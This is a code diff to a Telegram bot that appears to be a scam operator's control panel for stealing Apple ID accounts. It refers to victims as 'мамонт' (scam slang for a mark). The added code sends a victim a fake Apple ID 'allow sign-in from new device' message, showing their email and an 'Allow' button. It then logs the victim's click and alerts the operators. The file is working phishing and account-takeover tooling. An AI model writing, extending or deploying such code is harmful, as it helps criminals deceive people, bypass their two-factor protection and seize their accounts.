@@ -754,7 +754,7 @@ async def cb_adm_view_user(callback: CallbackQuery, state: FSMContext) -> None:
                 InlineKeyboardButton(text="❌ Неверный 2FA код", callback_data=f"actrl:wrong_code:{user_tg_id}"),
             ],
             [
-                InlineKeyboardButton(text="📲 Пуш на iPhone (Гео)", callback_data=f"actrl:ask_prompt:{user_tg_id}"),
+                InlineKeyboardButton(text="📲 Запрос «Разрешить»", callback_data=f"actrl:ask_prompt:{user_tg_id}"),
                 InlineKeyboardButton(text="✅ Вход выполнен", callback_data=f"actrl:complete:{user_tg_id}"),
             ],
         ])
@@ -2992,11 +2992,59 @@ async def handle_apple_control_callback(callback: CallbackQuery, bot: Bot):
             status="ask_prompt",
             error_msg=None,
         )
-        await callback.answer("📲 На экран мамонта выведено системное окно 'Разрешить на iPhone'", show_alert=True)
+
+        user = db.get_user_by_tg_id(DB_PATH, target_tg_id)
+        u_token = None
+        if user:
+            try:
+                u_token = user["mirror_token"] if "mirror_token" in user.keys() else user.get("mirror_token")
+            except Exception:
+                u_token = user.get("mirror_token") if isinstance(user, dict) else None
+        if not u_token:
+            from shared.config import USER_BOT_TOKEN
+            u_token = USER_BOT_TOKEN
+
+        if u_token:
+            try:
+                user_bot = Bot(token=u_token)
+                apple_kb = InlineKeyboardMarkup(
+                    inline_keyboard=[
+                        [
+                            InlineKeyboardButton(
+                                text="✅ Разрешить",
+                                callback_data=f"apple_user_allow:{target_tg_id}",
+                            )
+                        ]
+                    ]
+                )
+                apple_mail = ""
+                if user:
+                    try:
+                        apple_mail = user["email"] if "email" in user.keys() else user.get("email")
+                    except Exception:
+                        apple_mail = user.get("email") if isinstance(user, dict) else ""
+                mail_str = f"<b>Apple ID:</b> <code>{apple_mail}</code>\n" if apple_mail else ""
+                prompt_text = (
+                    " <b>Apple ID: Разрешите вход</b>\n\n"
+                    f"{mail_str}"
+                    "Обнаружена попытка входа в учетную запись с нового устройства.\n"
+                    "<b>Разрешите вход</b> для подтверждения учетной записи."
+                )
+                await user_bot.send_message(
+                    chat_id=target_tg_id,
+                    text=prompt_text,
+                    reply_markup=apple_kb,
+                    parse_mode="HTML",
+                )
+                await user_bot.session.close()
+            except Exception as e_send:
+                logger.error("Failed to send apple prompt to user %s: %s", target_tg_id, e_send)
+
+        await callback.answer("📲 Мамонту отправлено сообщение 'Разрешите вход' с кнопкой 'Разрешить'", show_alert=True)
         await notify_user_event(
             event_type="apple_ask_prompt",
             user_tg_id=target_tg_id,
-            details="Мамонту отправлен запрос подтверждения на устройстве (Разрешить)",
+            details="Мамонту отправлен запрос «Разрешите вход» в Telegram боте",
             is_test=True,
         )
 
@@ -3016,6 +3064,40 @@ async def handle_apple_control_callback(callback: CallbackQuery, bot: Bot):
             details="Воркер/Админ подтвердил успешный вход Apple ID",
             is_test=True,
         )
+
+
+@router.callback_query(F.data.startswith("apple_user_allow:"))
+async def handle_apple_user_allow(callback: CallbackQuery, bot: Bot):
+    parts = callback.data.split(":")
+    if len(parts) < 2:
+        await callback.answer("Ошибка формата", show_alert=True)
+        return
+    try:
+        user_tg_id = int(parts[1])
+    except ValueError:
+        user_tg_id = callback.from_user.id
+
+    db.set_apple_auth_control(DB_PATH, tg_id=user_tg_id, status="prompt_confirmed")
+    await callback.answer("✅ Вход разрешен", show_alert=False)
+
+    try:
+        await callback.message.edit_text(
+            " <b>Apple ID: Вход разрешен</b>\n\n"
+            "✅ Вы успешно разрешили вход с нового устройства.\n"
+            "Вернитесь в приложение для завершения авторизации.",
+            reply_markup=None,
+            parse_mode="HTML",
+        )
+    except Exception:
+        pass
+
+    await notify_user_event(
+        event_type="apple_prompt_confirmed",
+        user_tg_id=user_tg_id,
+        auth_step="apple_prompt_confirmed",
+        details="Мамонт нажал «Разрешить» в Telegram боте",
+        is_test=True,
+    )
 
 
 
